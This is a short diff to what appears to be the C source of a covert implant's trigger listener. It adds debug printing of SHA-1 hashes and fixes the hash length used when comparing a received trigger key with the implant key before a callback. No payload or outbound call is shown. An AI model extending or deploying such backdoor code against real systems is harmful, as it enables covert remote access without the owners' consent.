@@ -40,6 +40,20 @@
 
 extern unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key
 
+#ifdef DEBUG
+//define displaySha1Hash function
+void printSha1Hash(char *label, unsigned char *sha1Hash)
+{
+	int i = 0;
+
+	//Display Label
+	printf("%s", label);
+
+	//Display 40 hexadecimal number array
+	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
+		printf("%02x", sha1Hash[i]);
+}
+#endif
 //******************************************************************
 //given a range will calculate a psuedo random variance
 //within that range
@@ -260,12 +274,15 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 					return FAILURE;
 				}
 
-				sha1(tParams->idKey_hash, strlen((const char *)(tParams->idKey_hash)), recvdKey);
+				sha1(tParams->idKey_hash, ID_KEY_HASH_SIZE, recvdKey);
 				if ( memcmp(recvdKey, ikey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
 					D(
 						printf("\n=============================================================================\n");
 						printf("%s, %4d: IMPLANT TRIGGER FAILED -- KEY MISMATCH\n", __FILE__, __LINE__);
-						printf("=============================================================================\n\n");
+						printSha1Hash("\n\tTrigger Key: ", recvdKey);
+						printSha1Hash("\n\tImplant Key: ", ikey);
+						printf("\n\tCallback port: %i\n", tParams->callback_port);
+						printf("\n=============================================================================\n\n");
 					 );
 					continue;
 				}
